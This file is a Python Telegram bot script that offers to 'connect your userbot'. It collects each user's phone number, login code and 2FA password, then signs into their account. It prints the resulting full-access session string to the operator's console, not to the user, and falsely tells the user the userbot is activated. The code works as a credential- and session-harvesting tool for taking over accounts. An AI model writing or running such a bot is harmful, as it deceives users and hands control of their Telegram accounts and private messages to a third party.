import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import os

# ================= CONFIG =================
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

# ================= BOT =================
bot = TelegramClient("bot", API_ID, API_HASH)

# user state storage
user_state = {}

# ================= START =================
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.reply(
        "👋 Welcome!\n\n"
        "Use /login to connect your userbot."
    )

# ================= LOGIN START =================
@bot.on(events.NewMessage(pattern="/login"))
async def login(event):
    user_id = event.sender_id

    user_state[user_id] = {
        "step": "phone"
    }

    await event.reply("📱 Send your phone number with country code (+91xxxxxxx)")

# ================= MESSAGE HANDLER =================
@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.raw_text

    # ignore bot messages
    if user_id is None or event.is_group:
        return

    # check state
    if user_id not in user_state:
        return

    state = user_state[user_id]
    step = state.get("step")

    # ============ STEP 1: PHONE ============
    if step == "phone":
        phone = text.strip() if text else None

        if not phone or not phone.startswith("+"):
            return await event.reply("❌ Invalid phone number. Example: +91xxxxxxxxxx")

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            await client.send_code_request(phone)

            state["phone"] = phone
            state["client"] = client
            state["step"] = "otp"

            await event.reply("📩 OTP sent to your Telegram/SMS.\nSend OTP now.")

        except Exception as e:
            await event.reply(f"❌ Failed to send OTP:\n{str(e)}")

    # ============ STEP 2: OTP ============
    elif step == "otp":
        otp = text.strip() if text else None
        client = state.get("client")
        phone = state.get("phone")

        if not otp or not client or not phone:
            return await event.reply("❌ Missing OTP or session expired. Try /login again.")

        try:
            await client.sign_in(phone, otp)

        except Exception as e:
            # 2FA password case
            if "SessionPasswordNeededError" in str(e):
                state["step"] = "password"
                return await event.reply("🔐 Enter your 2FA password:")

            return await event.reply(f"❌ OTP Error:\n{str(e)}")

        session_str = client.session.save()

        await event.reply("✅ Login successful!\nUserbot activated.")

        print(f"\nSESSION for {user_id}:\n{session_str}\n")

        await client.disconnect()
        del user_state[user_id]

    # ============ STEP 3: 2FA PASSWORD ============
    elif step == "password":
        password = text.strip() if text else None
        client = state.get("client")

        if not password or not client:
            return await event.reply("❌ Invalid password or session expired.")

        try:
            await client.sign_in(password=password)

            session_str = client.session.save()

            await event.reply("✅ 2FA Login successful!\nUserbot activated.")

            print(f"\nSESSION (2FA) for {user_id}:\n{session_str}\n")

            await client.disconnect()
            del user_state[user_id]

        except Exception as e:
            await event.reply(f"❌ 2FA Error:\n{str(e)}")

# ================= RUN =================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("Bot is running...")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
